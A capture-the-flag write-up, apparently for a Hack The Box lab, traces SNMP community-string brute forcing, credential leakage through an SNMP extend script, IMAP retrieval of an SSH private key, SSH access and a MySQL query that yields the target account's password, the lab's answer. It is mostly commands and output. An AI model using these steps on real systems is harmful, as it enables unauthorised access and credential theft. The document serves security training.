## Task

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

---

> Q1: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

## Attack Summary j

|Step|Vector|Outcome|
|---|---|---|
|1|Nmap scan|Found SSH, POP3, IMAP (plain + SSL), and port state differences between scans|
|2|IMAP/POP3 unauthenticated access|Confirmed no anonymous access is allowed|
|3|UDP scan|Found open SNMP (161/udp)|
|4|SNMP community string brute force|Found community string `backup`|
|5|SNMP walk (`NET-SNMP-EXTEND-MIB`)|Leaked credentials `tom:NMds732Js2761` from a recovery script's extend output|
|6|IMAP login as tom|Read inbox, found an embedded OpenSSH private key in an email|
|7|SSH login with recovered key|Shell access as `tom`|
|8|Local service enumeration|Found MySQL bound to loopback (127.0.0.1:3306)|
|9|`.mysql_history` review|Confirmed a `users` database exists|
|10|MySQL login (same password as tom)|Queried `users` table and retrieved HTB's password|

---

## Nmap Scan

```bash
sudo nmap 10.129.14.94 -sC -sV --open
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=NIXHARD
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
```

```bash
nmap -p- 10.129.202.20 --open
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
110/tcp open  pop3
143/tcp open  imap
993/tcp open  imaps
995/tcp open  pop3s
```

The host runs SSH, POP3, and IMAP (plain and SSL). The IMAP certificate leaks the hostname `NIXHARD`.

---

## Mail Service Enumeration (POP3/IMAP)

```bash
telnet 10.129.202.20 110
telnet 10.129.202.20 143
```

```
+OK Dovecot (Ubuntu) ready.
HELO
-ERR Unknown command.
...
-ERR Too many invalid bad commands.
Connection closed by foreign host.
```

Unauthenticated/anonymous access is not possible on either POP3 or IMAP, so valid credentials are required.

---

## UDP Port Enumeration

```bash
nmap -sU 10.129.202.20 -T4
```

```
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
[...]
```

Port 161/udp (SNMP) is open.

```bash
nmap -sU 10.129.202.20 -T4 -p 161 --script snmp-info
```

```
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5b99e75a10288b6100000000
|   snmpEngineBoots: 10
|_  snmpEngineTime: 29m55s
```

SNMP is confirmed as a net-snmp instance.

---

## SNMP Enumeration

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -w 100 10.129.202.20
```

```
10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

Community string brute forcing finds the valid string `backup`.

```bash
snmpwalk -v2c -c backup 10.129.202.20
```

```
iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"
iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
chpasswd: (line 1, user tom) password not changed
Changing password for tom."
```

The `NET-SNMP-EXTEND-MIB` output for the `/opt/tom-recovery.sh` extend entry leaks the credentials `tom:NMds732Js2761` in its process arguments and error output.

> [!note] The password was exposed because a password-change script was registered as an SNMP extend command, passing the plaintext password as a command-line argument, which net-snmp then reflects back in the walk output.

---

## IMAP Access as tom

```bash
telnet 10.129.202.20 143
```

```
1a LOGIN tom NMds732Js2761
1a OK [...] Logged in
```

The recovered credentials are valid for the IMAP server.

```
1a LIST "" *
* LIST (\HasNoChildren) "." Notes
* LIST (\HasNoChildren) "." Meetings
* LIST (\HasNoChildren \UnMarked) "." Important
* LIST (\HasNoChildren) "." INBOX
```

```
1a SELECT INBOX
* 1 EXISTS
1a OK [READ-WRITE] Select completed
```

```
1a FETCH 1 BODY[]
* 1 FETCH (BODY[] {3661}
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
[...]
-----END OPENSSH PRIVATE KEY-----
)
1a OK Fetch completed
```

The single message in tom's inbox contains an embedded OpenSSH private key, saved locally for SSH access.

---

## SSH Access as tom

```bash
chmod 600 id_rsa
ssh tom@10.129.202.20 -i id_rsa
```

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
Last login: Wed Nov 10 02:51:52 2021 from 10.10.14.20
tom@NIXHARD:~$
```

The extracted private key grants shell access as `tom`.

---

## Local Service Enumeration

```bash
ss -tlpn
```

```
State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process       
LISTEN       0            4096               127.0.0.53%lo:53                      0.0.0.0:*                        
LISTEN       0            128                      0.0.0.0:22                      0.0.0.0:*                        
LISTEN       0            100                      0.0.0.0:993                     0.0.0.0:*                        
LISTEN       0            100                      0.0.0.0:995                     0.0.0.0:*                        
LISTEN       0            70                     127.0.0.1:33060                   0.0.0.0:*                        
LISTEN       0            151                    127.0.0.1:3306                    0.0.0.0:*                        
LISTEN       0            100                      0.0.0.0:110                     0.0.0.0:*                        
LISTEN       0            100                      0.0.0.0:143                     0.0.0.0:*  
```

A MySQL instance is bound to loopback only (127.0.0.1:3306), alongside the mail services and a MySQL X Protocol port (33060).

```bash
ls -la
```

```
total 48
drwxr-xr-x 6 tom  tom  4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 tom  tom   532 Nov 10  2021 .bash_history
-rw-r--r-- 1 tom  tom   220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Nov 10  2021 .bashrc
drwx------ 2 tom  tom  4096 Nov 10  2021 .cache
drwx------ 3 tom  tom  4096 Nov 10  2021 mail
drwx------ 8 tom  tom  4096 Nov  4 09:22 Maildir
-rw------- 1 tom  tom   169 Nov 10  2021 .mysql_history
-rw-r--r-- 1 tom  tom   807 Nov 10  2021 .profile
drwx------ 2 tom  tom  4096 Nov 10  2021 .ssh
-rw------- 1 tom  tom  2018 Nov 10  2021 .viminfo
```

The home directory enumeration reveals a readable `.mysql_history` file.

```bash
cat .mysql_history
```

```
_HiStOrY_V2_
show\040databases;
select\040*\040from\040users;
use\040users;
select\040*\040from\040users;
show\040databases;
use\040users;
select\040*\040from\040users;
```

The hidden `.mysql_history` file shows tom previously queried a `users` database.

```bash
ps aux | grep mysql
```

```
mysql        981  0.3 18.7 2142948 382468 ?      Ssl  08:29   0:15 /usr/sbin/mysqld
tom         3729  0.0  0.0   6432   740 pts/0    S+   09:49   0:00 grep --color=auto mysql
```

This confirms `mysqld` is running locally.

---

## MySQL Access and HTB Credential Recovery

```bash
mysql -u tom -p -h 127.0.0.1
```

```
Enter password: # NMds732Js2761
```

The same password recovered from SNMP (`NMds732Js2761`) grants MySQL access as `tom`.

```sql
show databases;
```

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
5 rows in set (0.01 sec)
```

```sql
use users;
```

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```sql
show tables;
```

```
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)
```

```sql
select * from users where username = 'HTB';
```

```
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.01 sec)
```

The `users` table in the `users` database contains the `HTB` account and its password.